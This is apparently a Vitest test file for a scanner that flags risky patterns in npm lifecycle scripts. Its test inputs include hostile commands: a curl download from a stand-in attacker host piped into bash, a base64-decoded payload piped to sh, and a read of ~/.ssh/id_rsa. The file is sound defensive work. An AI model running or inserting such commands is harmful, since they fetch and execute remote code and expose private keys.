import { describe, it, expect } from 'vitest';
import { analyzeLifecycleScriptRisk } from '../src/analyzer/scriptRisk';

describe('analyzeLifecycleScriptRisk', () => {
  it('detects a curl-to-shell pattern', () => {
    const risks = analyzeLifecycleScriptRisk('curl -s https://evil.example.com/payload.sh | bash');
    expect(risks).toContain('downloads over the network (curl)');
    expect(risks).toContain('pipes content directly into a shell or interpreter');
  });

  it('detects wget', () => {
    expect(analyzeLifecycleScriptRisk('wget https://example.com/file')).toContain('downloads over the network (wget)');
  });

  it('detects base64', () => {
    expect(analyzeLifecycleScriptRisk('echo ZmFrZQ== | base64 -d | sh')).toContain('base64 encoding/decoding (common obfuscation technique)');
  });

  it('detects chmod +x', () => {
    expect(analyzeLifecycleScriptRisk('chmod +x ./setup.sh && ./setup.sh')).toContain('makes a file executable (chmod +x or similar)');
  });

  it('detects sudo', () => {
    expect(analyzeLifecycleScriptRisk('sudo npm install -g something')).toContain('runs with elevated privileges (sudo)');
  });

  it('detects SSH key access', () => {
    expect(analyzeLifecycleScriptRisk('cat ~/.ssh/id_rsa')).toContain('reads/writes SSH keys');
  });

  it('returns an empty array for an innocuous command', () => {
    expect(analyzeLifecycleScriptRisk('node-gyp rebuild')).toEqual([]);
    expect(analyzeLifecycleScriptRisk('echo done')).toEqual([]);
  });
});
